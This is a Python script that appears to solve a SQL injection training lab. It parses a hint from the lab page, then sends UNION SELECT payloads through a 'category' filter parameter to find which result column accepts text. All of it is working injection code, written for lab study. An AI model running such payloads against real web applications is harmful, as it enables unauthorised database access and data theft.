#!/usr/bin/env python3
"""SQL injection UNION attack, finding a column containing text"""

import bs4

import lab_03

class Lab(lab_03.Lab):
    """Wrapper"""

    # pylint: disable=too-many-arguments
    def column_string_type(self, key: str, path: str, text: str, column: int,
                           size: int) -> bool:
        """Column index contains text"""
        nulls = ["NULL"] * size
        nulls[column] = f"'{text}'"
        query = "'+UNION+SELECT+{}--".format(",".join(nulls))
        payload = {key: query}
        payload_str = "&".join("%s=%s" % (k, v) for k, v in payload.items())
        response = self.session.get(self.url + path, params=payload_str)
        return response.status_code == 200

    def query_string(self) -> str:
        """Get the string to query the database with"""
        response = self.session.get(self.url + "/")
        response.raise_for_status()
        soup = bs4.BeautifulSoup(response.text, features="lxml")
        hint = soup.find("p", attrs={"id": "hint"})
        if hint is None:
            raise RuntimeError("Cannot find query string")
        return hint.text.split()[-1].strip("'")

    def column_index_for_query(self, key: str, path: str, text: str) -> int:
        """Get the index for the query string"""
        column_count = self.column_count(key, path)
        for i in range(column_count):
            if self.column_string_type(key, path, text, i, column_count):
                return i
        raise RuntimeError(f"Failed to identify index for {text}")

def main() -> None:
    """Entry point"""
    site = Lab()
    text = site.query_string()
    print(site.column_index_for_query(key="category", path="/filter", text=text))

if __name__ == "__main__":
    main()
